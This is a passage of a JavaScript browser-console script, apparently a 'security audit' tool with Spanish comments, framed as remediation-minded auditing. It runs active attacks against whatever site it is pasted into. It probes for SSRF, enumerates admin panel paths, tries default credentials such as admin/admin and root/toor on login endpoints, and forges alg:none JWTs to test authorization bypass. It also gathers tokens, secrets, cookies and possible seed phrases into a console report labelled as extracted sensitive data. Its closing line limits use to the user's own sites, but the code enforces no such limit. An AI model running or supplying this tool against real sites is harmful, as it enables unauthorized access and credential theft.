                const result = await testRequest(`${baseUrl}${ep}?${param}=${encodeURIComponent(payload)}`);
                if (result.ok && result.status === 200) {
                    const lowerText = result.text.toLowerCase();
                    if (lowerText.includes('root:') || lowerText.includes('ami-id') || lowerText.includes('instance-id') || 
                        lowerText.includes('meta-data') || lowerText.includes('localhost') || lowerText.includes('127.0.0.1') ||
                        lowerText.includes('internal') || lowerText.includes('private') || lowerText.includes('redis')) {
                        extractedData.injectionVulns.push({ type: 'SSRF', endpoint: ep, param, payload });
                        logCritical(`SSRF en ${ep}?${param}=...`);
                        addFinding('critical', 'SSRF (Server-Side Request Forgery)', `${ep}?${param} permite acceder recursos internos`, 'Validar y sanitizar URLs, usar whitelist de dominios', { endpoint: ep, param, payload });
                    }
                }
            }
        }
    }

    // ==========================================================================
    // BLOQUE 48: PANELES DE ADMIN
    // ==========================================================================
    log('BUSCANDO PANELES DE ADMINISTRACION...');
    const adminPaths = [
        '/admin', '/admin/', '/admin/login', '/admin/dashboard', '/admin/panel',
        '/administrator', '/administrator/login', '/admin.php', '/admin.html',
        '/wp-admin', '/wp-admin/', '/wp-login.php', '/wordpress/wp-admin',
        '/manager', '/manager/', '/manager/html', '/manager/text',
        '/cpanel', '/cpanel/', '/cPanel', '/whm',
        '/panel', '/panel/', '/control', '/controlpanel',
        '/dashboard', '/dashboard/', '/portal', '/portal/',
        '/backend', '/backend/', '/backoffice', '/back-office',
        '/sysadmin', '/webadmin', '/admin_area', '/adminarea',
        '/admin-console', '/admin_console', '/adminconsole',
        '/moderator', '/webmaster', '/master', '/root',
        '/secure', '/secure/', '/private', '/private/',
        '/login', '/signin', '/sign-in', '/auth',
        '/phpmyadmin', '/phpmyadmin/', '/pma', '/myadmin',
        '/mysql', '/mysql/', '/mysqladmin',
        '/pgadmin', '/pgadmin/', '/postgres',
        '/adminer', '/adminer.php',
        '/api/admin', '/api/v1/admin', '/api/v2/admin',
        '/graphql', '/graphql/', '/__graphql',
        '/api/graphql', '/graphiql',
        '/console', '/debug', '/dev', '/test',
        '/swagger', '/swagger/', '/swagger-ui', '/swagger-ui/',
        '/api-docs', '/api/docs', '/docs/api',
        '/redoc', '/openapi', '/openapi.json'
    ];

    for (const path of adminPaths) {
        const result = await testRequest(baseUrl + path);
        if (result.ok && (result.status === 200 || result.status === 401 || result.status === 403)) {
            const isForm = result.text.includes('<form') && (result.text.includes('password') || result.text.includes('login'));
            const isAdmin = /admin|dashboard|panel|login|manage|console/i.test(result.text);
            
            if (result.status === 200 && isAdmin) {
                extractedData.adminPanels.push({ path, status: result.status, hasForm: isForm, size: result.text.length });
                logCritical(`Panel admin encontrado: ${path}`);
                addFinding('high', 'Panel de Administracion Encontrado', `${path} accesible (status ${result.status})`, 'Proteger con autenticacion fuerte y 2FA', { path, status: result.status });
            } else if (result.status === 200) {
                addFinding('medium', 'Ruta Administrativa Encontrada', `${path} existe y responde`, 'Verificar proteccion de acceso');
            }
        }
    }

    // ==========================================================================
    // BLOQUE 49: PRUEBAS DE AUTENTICACION AGRESIVAS
    // ==========================================================================
    log('REALIZANDO PRUEBAS DE AUTENTICACION AGRESIVAS...');
    const loginEndpoints = ['/login', '/signin', '/api/login', '/api/auth/login', '/api/v1/auth/login', '/api/auth', '/auth/login', '/api/signin', '/user/login'];
    const commonCredentials = [
        { user: 'admin', pass: 'admin' }, { user: 'admin', pass: 'password' },
        { user: 'admin', pass: '123456' }, { user: 'admin', pass: 'admin123' },
        { user: 'root', pass: 'root' }, { user: 'root', pass: 'toor' },
        { user: 'test', pass: 'test' }, { user: 'user', pass: 'user' },
        { user: 'demo', pass: 'demo' }, { user: 'guest', pass: 'guest' },
        { user: 'administrator', pass: 'administrator' },
        { user: 'admin', pass: 'Admin@123' }, { user: 'admin', pass: 'Password1' }
    ];

    for (const ep of loginEndpoints) {
        let successfulLogins = 0;
        let noRateLimit = 0;
        
        for (const cred of commonCredentials.slice(0, 8)) {
            const result = await testRequest(baseUrl + ep, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: cred.user, password: cred.pass, email: cred.user, login: cred.user })
            });
            
            if (result.ok) {
                if (result.status === 200 && (result.text.includes('token') || result.text.includes('success') || result.text.includes('welcome'))) {
                    successfulLogins++;
                    logCritical(`Credencial por defecto encontrada: ${cred.user}:${cred.pass} en ${ep}`);
                    addFinding('critical', 'Credencial Por Defecto', `${ep} acepta ${cred.user}:${cred.pass}`, 'Cambiar credenciales por defecto inmediatamente', { endpoint: ep, user: cred.user });
                }
                if (result.status !== 429) noRateLimit++;
            }
        }
        
        if (noRateLimit >= 8) {
            addFinding('high', 'Sin Rate Limiting en Login', `${ep} permite ${noRateLimit}+ intentos sin bloqueo`, 'Implementar rate limiting y captcha');
        }
    }

    // JWT Tampering tests
    log('PROBANDO VULNERABILIDADES JWT...');
    for (const ep of loginEndpoints) {
        const result = await testRequest(baseUrl + ep, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: 'test', password: 'test' })
        });
        
        if (result.ok) {
            const jwtMatch = result.text.match(/eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/);
            if (jwtMatch) {
                try {
                    const jwt = jwtMatch[0];
                    const [headerB64, payloadB64, sig] = jwt.split('.');
                    const header = JSON.parse(atob(headerB64));
                    const payload = JSON.parse(atob(payloadB64));
                    
                    extractedData.tokens.push({ type: 'JWT de Login', endpoint: ep, value: jwt, header, payload });
                    
                    if (header.alg === 'none' || header.alg === 'None' || header.alg === 'NONE') {
                        addFinding('critical', 'JWT con Algoritmo None', 'JWT permite algoritmo none - bypass total', 'Forzar algoritmos seguros (RS256, ES256)');
                    }
                    if (header.alg === 'HS256' && !header.kid) {
                        addFinding('medium', 'JWT HS256 sin KID', 'JWT usa HS256 sin key ID', 'Considerar RS256 o agregar KID');
                    }
                    if (payload.exp && payload.exp > (Date.now()/1000 + 86400*30)) {
                        addFinding('medium', 'JWT con Expiracion Larga', 'JWT expira en mas de 30 dias', 'Usar expiraciones cortas (15-60 min)');
                    }
                    if (!payload.exp) {
                        addFinding('high', 'JWT sin Expiracion', 'JWT no tiene campo exp', 'Agregar expiracion a todos los tokens');
                    }
                    
                    // Test algorithm confusion
                    const noneHeader = btoa(JSON.stringify({alg: 'none', typ: 'JWT'})).replace(/=/g, '');
                    const tamperedJwt = noneHeader + '.' + payloadB64 + '.';
                    
                    for (const testEp of sensitiveEndpoints.slice(0, 3)) {
                        const testResult = await testRequest(baseUrl + testEp, {
                            headers: { 'Authorization': 'Bearer ' + tamperedJwt }
                        });
                        if (testResult.ok && testResult.status === 200) {
                            addFinding('critical', 'JWT Algorithm Confusion', `${testEp} acepta JWT con alg:none`, 'Validar algoritmo del lado servidor');
                        }
                    }
                } catch(e) {}
            }
        }
    }

    // ==========================================================================
    // BLOQUE 50: VERIFICACIONES FINALES Y TELEGRAM/TON
    // ==========================================================================
    log('VERIFICACIONES FINALES ESPECIFICAS (Telegram/TON/Crypto)...');
    
    // Buscar datos de Telegram
    const telegramPatterns = [
        /Telegram\.WebApp/gi,
        /TelegramWebviewProxy/gi,
        /initData/gi,
        /initDataUnsafe/gi,
        /WebApp\.initData/gi,
        /tgWebAppData/gi,
        /tgWebAppVersion/gi,
        /user_id.*?[0-9]{5,}/gi,
        /first_name/gi,
        /username/gi
    ];

    document.querySelectorAll('script').forEach(script => {
        const code = script.textContent || script.src || '';
        telegramPatterns.forEach(pattern => {
            if (pattern.test(code)) {
                addFinding('info', 'Telegram WebApp Detectado', 'Este sitio usa Telegram WebApp', 'Asegurar que initData se valide en backend');
            }
        });
    });

    // Buscar TON Connect
    if (window.tonConnectUI || window.TonConnect || window.TON) {
        addFinding('info', 'TON Connect Detectado', 'Este sitio usa TON wallet', 'Verificar seguridad de transacciones');
        if (window.walletAddress || window.WALLET_ADDRESS) {
            addFinding('high', 'Wallet Address Expuesta', 'Direccion de wallet en variable global', 'No exponer direcciones en frontend');
        }
    }

    // Buscar mnemonics expuestos
    const htmlContent = document.documentElement.innerHTML;
    const mnemonicMatch = htmlContent.match(/\b([a-z]+\s+){11,23}[a-z]+\b/gi);
    if (mnemonicMatch) {
        mnemonicMatch.forEach(m => {
            const words = m.split(/\s+/);
            if (words.length >= 12 && words.length <= 24 && words.every(w => /^[a-z]+$/i.test(w))) {
                addFinding('critical', 'Mnemonic Phrase Expuesta', 'Posible seed phrase encontrada en HTML', 'NUNCA exponer seed phrases en el frontend', { found: m.substring(0, 50) + '...' });
            }
        });
    }

    // WebSocket security
    document.querySelectorAll('script').forEach(s => {
        const code = s.textContent || '';
        if (/new\s+WebSocket\s*\(\s*['"]ws:/i.test(code)) {
            addFinding('high', 'WebSocket Inseguro', 'Usa ws:// en lugar de wss://', 'Cambiar a wss:// para encriptacion');
        }
    });

    // Service Worker check
    if ('serviceWorker' in navigator) {
        try {
            const regs = await navigator.serviceWorker.getRegistrations();
            regs.forEach(r => {
                addFinding('info', 'Service Worker Registrado', r.active?.scriptURL || 'SW activo', 'Verificar que no cachee datos sensibles');
            });
        } catch(e) {}
    }

    // ==========================================================================
    // GENERAR REPORTE FINAL COMPLETO
    // ==========================================================================
    console.log('\n' + '█'.repeat(80));
    console.log('%c  ██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗███████╗', 'font-size:12px;color:#ff0000;font-weight:bold');
    console.log('%c  ██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝', 'font-size:12px;color:#ff0000;font-weight:bold');
    console.log('%c  ██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║   █████╗  ', 'font-size:12px;color:#ff0000;font-weight:bold');
    console.log('%c  ██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔══╝  ', 'font-size:12px;color:#ff0000;font-weight:bold');
    console.log('%c  ██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   ███████╗', 'font-size:12px;color:#ff0000;font-weight:bold');
    console.log('%c  ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝', 'font-size:12px;color:#ff0000;font-weight:bold');
    console.log('█'.repeat(80));

    const total = results.critical.length + results.high.length + results.medium.length + results.low.length;
    
    console.log('\n%c┌─────────────────────────────────────────────────────────────┐', 'color:#00ff00');
    console.log('%c│              RESUMEN DE VULNERABILIDADES                     │', 'color:#00ff00;font-weight:bold');
    console.log('%c├─────────────────────────────────────────────────────────────┤', 'color:#00ff00');
    console.log(`%c│  🔴 CRITICO:  ${String(results.critical.length).padEnd(4)} problemas                                │`, 'color:#ff0000;font-weight:bold');
    console.log(`%c│  🟠 ALTO:     ${String(results.high.length).padEnd(4)} problemas                                │`, 'color:#ff8800;font-weight:bold');
    console.log(`%c│  🟡 MEDIO:    ${String(results.medium.length).padEnd(4)} problemas                                │`, 'color:#ffff00;font-weight:bold');
    console.log(`%c│  🟢 BAJO:     ${String(results.low.length).padEnd(4)} problemas                                │`, 'color:#00ff00;font-weight:bold');
    console.log(`%c│  🔵 INFO:     ${String(results.info.length).padEnd(4)} observaciones                           │`, 'color:#00ffff;font-weight:bold');
    console.log('%c├─────────────────────────────────────────────────────────────┤', 'color:#00ff00');
    console.log(`%c│  📊 TOTAL:    ${String(total).padEnd(4)} vulnerabilidades encontradas            │`, 'color:#ff0000;font-weight:bold;font-size:14px');
    console.log('%c└─────────────────────────────────────────────────────────────┘', 'color:#00ff00');

    // Mostrar datos extraidos detallados
    console.log('\n' + '█'.repeat(80));
    console.log('%c  💀 DATOS SENSIBLES EXTRAIDOS 💀', 'font-size:18px;color:#ff0000;font-weight:bold;background:#ffff00;padding:5px');
    console.log('█'.repeat(80));

    if (extractedData.tokens.length > 0) {
        console.log('\n%c  🔑 TOKENS Y JWTS ENCONTRADOS:', 'color:#ff0000;font-size:14px;font-weight:bold');
        console.log('%c  ' + '─'.repeat(60), 'color:#888');
        extractedData.tokens.forEach((t, i) => {
            console.log(`%c  ${i+1}. [${t.type}]`, 'color:#ff8800;font-weight:bold');
            console.log(`%c     Ubicacion: ${t.name || t.key || t.endpoint || 'N/A'}`, 'color:#ffff00');
            console.log(`%c     Valor: ${t.value.substring(0, 80)}...`, 'color:#ff0000');
            if (t.decoded) {
                console.log(`%c     Decodificado: ${JSON.stringify(t.decoded).substring(0, 100)}`, 'color:#ff00ff');
            }
        });
    }

    if (extractedData.secrets.length > 0) {
        console.log('\n%c  🔐 SECRETOS ENCONTRADOS:', 'color:#ff0000;font-size:14px;font-weight:bold');
        console.log('%c  ' + '─'.repeat(60), 'color:#888');
        const uniqueSecrets = [...new Map(extractedData.secrets.map(s => [s.value, s])).values()];
        uniqueSecrets.slice(0, 20).forEach((s, i) => {
            console.log(`%c  ${i+1}. [${s.type}]`, 'color:#ff8800;font-weight:bold');
            console.log(`%c     Fuente: ${s.source}`, 'color:#ffff00');
            console.log(`%c     Valor: ${s.value.substring(0, 100)}`, 'color:#ff0000');
        });
    }

    if (extractedData.exposedFiles.length > 0) {
        console.log('\n%c  📁 ARCHIVOS SENSIBLES ACCESIBLES:', 'color:#ff0000;font-size:14px;font-weight:bold');
        console.log('%c  ' + '─'.repeat(60), 'color:#888');
        extractedData.exposedFiles.forEach((f, i) => {
            console.log(`%c  ${i+1}. ${f.file}`, 'color:#ff8800;font-weight:bold');
            console.log(`%c     Tamaño: ${f.size} bytes`, 'color:#ffff00');
            console.log(`%c     Preview: ${f.preview.substring(0, 100).replace(/\n/g, ' ')}...`, 'color:#888');
        });
    }

    if (extractedData.injectionVulns.length > 0) {
        console.log('\n%c  💉 VULNERABILIDADES DE INYECCION:', 'color:#ff0000;font-size:14px;font-weight:bold');
        console.log('%c  ' + '─'.repeat(60), 'color:#888');
        extractedData.injectionVulns.forEach((v, i) => {
            console.log(`%c  ${i+1}. [${v.type}]`, 'color:#ff0000;font-weight:bold');
            console.log(`%c     Endpoint: ${v.endpoint}`, 'color:#ff8800');
            if (v.param) console.log(`%c     Parametro: ${v.param}`, 'color:#ffff00');
            if (v.payload) console.log(`%c     Payload: ${v.payload.substring(0, 60)}`, 'color:#888');
        });
    }

    if (extractedData.authIssues.length > 0) {
        console.log('\n%c  🚨 ENDPOINTS SIN AUTENTICACION:', 'color:#ff0000;font-size:14px;font-weight:bold');
        console.log('%c  ' + '─'.repeat(60), 'color:#888');
        extractedData.authIssues.forEach((a, i) => {
            console.log(`%c  ${i+1}. ${a.endpoint}`, 'color:#ff0000;font-weight:bold');
            console.log(`%c     Status: ${a.status} | Tamaño: ${a.size} bytes`, 'color:#ff8800');
        });
    }

    if (extractedData.adminPanels.length > 0) {
        console.log('\n%c  👑 PANELES DE ADMINISTRACION:', 'color:#ff0000;font-size:14px;font-weight:bold');
        console.log('%c  ' + '─'.repeat(60), 'color:#888');
        extractedData.adminPanels.forEach((p, i) => {
            console.log(`%c  ${i+1}. ${p.path}`, 'color:#ff8800;font-weight:bold');
            console.log(`%c     Status: ${p.status} | Form: ${p.hasForm ? 'Si' : 'No'}`, 'color:#ffff00');
        });
    }

    if (extractedData.cookies.length > 0) {
        console.log('\n%c  🍪 COOKIES ACCESIBLES POR JS:', 'color:#ff0000;font-size:14px;font-weight:bold');
        console.log('%c  ' + '─'.repeat(60), 'color:#888');
        extractedData.cookies.forEach((c, i) => {
            console.log(`%c  ${i+1}. ${c.name}`, 'color:#ff8800;font-weight:bold');
            console.log(`%c     Valor: ${c.value.substring(0, 80)}...`, 'color:#888');
        });
    }

    if (extractedData.globals.length > 0) {
        console.log('\n%c  🌐 VARIABLES GLOBALES EXPUESTAS:', 'color:#ff0000;font-size:14px;font-weight:bold');
        console.log('%c  ' + '─'.repeat(60), 'color:#888');
        extractedData.globals.forEach((g, i) => {
            console.log(`%c  ${i+1}. window.${g.name}`, 'color:#ff8800;font-weight:bold');
            console.log(`%c     Tipo: ${g.type} | Valor: ${g.value.substring(0, 80)}...`, 'color:#888');
        });
    }

    // Mostrar detalles de cada categoria
    console.log('\n' + '█'.repeat(80));
    console.log('%c  📋 DETALLE DE VULNERABILIDADES POR CATEGORIA', 'font-size:16px;color:#00ff00;font-weight:bold');
    console.log('█'.repeat(80));

    if (results.critical.length > 0) {
        console.log('\n%c  🔴 CRITICOS (Requieren atencion INMEDIATA):', 'color:#ff0000;font-size:14px;font-weight:bold');
        console.log('%c  ' + '─'.repeat(60), 'color:#ff0000');
        results.critical.forEach((r, i) => {
            console.log(`%c  ${i+1}. ${r.test}`, 'color:#ff0000;font-weight:bold');
            console.log(`%c     → ${r.desc}`, 'color:#ff8888');
            console.log(`%c     ✓ Solucion: ${r.fix}`, 'color:#00ff00');
        });
    }

    if (results.high.length > 0) {
        console.log('\n%c  🟠 ALTOS (Resolver pronto):', 'color:#ff8800;font-size:14px;font-weight:bold');
        console.log('%c  ' + '─'.repeat(60), 'color:#ff8800');
        results.high.forEach((r, i) => {
            console.log(`%c  ${i+1}. ${r.test}`, 'color:#ff8800;font-weight:bold');
            console.log(`%c     → ${r.desc}`, 'color:#ffaa00');
            console.log(`%c     ✓ Solucion: ${r.fix}`, 'color:#00ff00');
        });
    }

    if (results.medium.length > 0) {
        console.log('\n%c  🟡 MEDIOS (Planificar correccion):', 'color:#ffff00;font-size:14px;font-weight:bold');
        console.log('%c  ' + '─'.repeat(60), 'color:#ffff00');
        results.medium.slice(0, 15).forEach((r, i) => {
            console.log(`%c  ${i+1}. ${r.test}: ${r.desc}`, 'color:#ffff00');
            console.log(`%c     ✓ ${r.fix}`, 'color:#00ff00');
        });
        if (results.medium.length > 15) {
            console.log(`%c  ... y ${results.medium.length - 15} mas`, 'color:#888');
        }
    }

    // Exportar JSON
    console.log('\n' + '█'.repeat(80));
    console.log('%c  📥 EXPORTAR REPORTE COMPLETO', 'font-size:16px;color:#00ffff;font-weight:bold');
    console.log('█'.repeat(80));

    const fullReport = {
        version: VERSION,
        url: baseUrl,
        timestamp: new Date().toISOString(),
        summary: {
            critical: results.critical.length,
            high: results.high.length,
            medium: results.medium.length,
            low: results.low.length,
            info: results.info.length,
            total: total
        },
        vulnerabilities: results,
        extractedData: extractedData
    };

    const jsonStr = JSON.stringify(fullReport, null, 2);
    const blob = new Blob([jsonStr], { type: 'application/json' });
    const downloadUrl = URL.createObjectURL(blob);
    
    console.log('%c  📄 Copia el siguiente codigo para descargar el reporte:', 'color:#00ffff');
    console.log(`%c  
    (function(){
        const a = document.createElement('a');
        a.href = '${downloadUrl}';
        a.download = 'bunk3r_audit_${new Date().toISOString().slice(0,10)}.json';
        a.click();
    })();
    `, 'color:#00ff00;background:#000;padding:10px;font-family:monospace');

    // Guardar en window para acceso programatico
    window.BUNK3R_AUDIT_REPORT = fullReport;
    console.log('\n%c  💾 Reporte guardado en: window.BUNK3R_AUDIT_REPORT', 'color:#00ffff;font-weight:bold');
    console.log('%c  Usa JSON.stringify(window.BUNK3R_AUDIT_REPORT, null, 2) para ver el JSON completo', 'color:#888');

    // Mensaje final
    console.log('\n' + '█'.repeat(80));
    if (results.critical.length > 0) {
        console.log('%c  ⚠️ SE ENCONTRARON VULNERABILIDADES CRITICAS', 'font-size:18px;color:#ff0000;font-weight:bold;background:#ffff00;padding:10px');
        console.log('%c  → Corrige los problemas CRITICOS antes de ir a produccion', 'color:#ff0000;font-size:14px');
    } else if (results.high.length > 0) {
        console.log('%c  ⚠️ SE ENCONTRARON VULNERABILIDADES ALTAS', 'font-size:18px;color:#ff8800;font-weight:bold');
        console.log('%c  → Revisa y corrige los problemas de alta prioridad', 'color:#ff8800;font-size:14px');
    } else if (total > 0) {
        console.log('%c  ⚡ Se encontraron algunos problemas menores', 'font-size:16px;color:#ffff00;font-weight:bold');
    } else {
        console.log('%c  ✅ No se detectaron vulnerabilidades obvias', 'font-size:16px;color:#00ff00;font-weight:bold');
        console.log('%c  (Esto no garantiza seguridad total - considera una auditoria profesional)', 'color:#888');
    }
    console.log('█'.repeat(80));
    console.log('%c  BUNK3R Security Audit v' + VERSION + ' - Auditoria completada', 'color:#00ff00');
    console.log('%c  Recuerda: Este script es para uso educativo en TUS propios sitios', 'color:#888');
    console.log('█'.repeat(80) + '\n');

    return fullReport;
})();
